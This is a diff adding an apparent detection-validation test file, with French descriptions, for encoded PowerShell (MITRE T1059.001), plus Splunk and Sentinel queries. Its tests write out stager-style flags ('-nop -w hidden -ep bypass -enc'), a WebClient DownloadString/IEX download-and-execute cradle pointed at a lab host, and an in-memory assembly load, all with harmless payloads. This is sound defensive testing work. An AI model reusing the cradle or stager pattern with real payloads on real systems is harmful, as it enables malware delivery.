@@ -1,0 +1,81 @@
+attack_technique: T1059.001
+display_name: Suspicious Encoded PowerShell
+related_sigma_rule: ../suspicious_powershell_encoded.yml
+expected_alert_within_seconds: 30
+prerequisites:
+  - Windows avec PowerShell 5.1 ou 7+
+  - Sysmon EID 1 ou Audit Process Creation (4688) activé
+  - Idéalement Script Block Logging (EID 4104) activé
+atomic_tests:
+  - name: PowerShell -EncodedCommand inoffensif (Hello World)
+    description: |
+      Lance powershell.exe avec -EncodedCommand contenant un simple Write-Host.
+      Doit déclencher la règle sur le seul flag -enc.
+    supported_platforms: [windows]
+    executor:
+      name: command_prompt
+      elevation_required: false
+      command: |
+        powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAQQBUAFQAJgBDAEsAIQAiAA==
+
+  - name: Combinaison Bypass + Hidden + EncodedCommand (Cobalt Strike-like)
+    description: |
+      Reproduit la signature classique des stagers Cobalt Strike, Empire et
+      PoshC2 : -nop -w hidden -ep bypass -enc <base64>.
+    supported_platforms: [windows]
+    executor:
+      name: command_prompt
+      elevation_required: false
+      command: |
+        powershell.exe -nop -w hidden -ep bypass -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAQwAyACAAcwBpAG0AdQBsAGEAdABpAG8AbgAiAA==
+
+  - name: Download cradle inoffensif (Net.WebClient + IEX)
+    description: |
+      Reproduit le pattern Net.WebClient / DownloadString / IEX vers un
+      domaine sinkholé inoffensif. NE PAS utiliser une URL réelle externe.
+    supported_platforms: [windows]
+    input_arguments:
+      sinkhole_url:
+        description: URL de lab interne servant un script inoffensif (Write-Host)
+        type: string
+        default: "http://lab.internal.test/test.ps1"
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        try {
+          IEX (New-Object Net.WebClient).DownloadString("#{sinkhole_url}")
+        } catch {
+          Write-Host "Test executed (connexion peut avoir échoué - normal en lab)"
+        }
+
+  - name: Reflective load base64 (PoC vide)
+    description: |
+      Décode un assembly .NET vide depuis base64 et le charge en mémoire.
+      Simule la primitive utilisée par les loaders fileless modernes.
+    supported_platforms: [windows]
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $b64 = "TVqQAAMAAAAEAAAA"
+        try {
+          [Reflection.Assembly]::Load([Convert]::FromBase64String($b64)) | Out-Null
+        } catch {
+          Write-Host "Load échoué (attendu : payload tronqué)"
+        }
+validation_queries:
+  splunk: |
+    index=sysmon EventCode=1 Image="*\\powershell.exe" earliest=-15m
+    | where match(CommandLine, "(?i)\\s-(enc|e|ec|EncodedCommand)\\s")
+        OR match(CommandLine, "(?i)(IEX|DownloadString|FromBase64String)")
+    | table _time, host, User, ParentImage, CommandLine
+  sentinel: |
+    DeviceProcessEvents
+    | where Timestamp > ago(15m)
+    | where FileName in~ ("powershell.exe","pwsh.exe")
+    | where ProcessCommandLine matches regex @"(?i)\s-(enc|e|ec|EncodedCommand)\s"
+        or ProcessCommandLine has_any ("IEX","DownloadString","FromBase64String")
+references:
+  - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.001
+  - https://github.com/danielbohannon/Invoke-Obfuscation
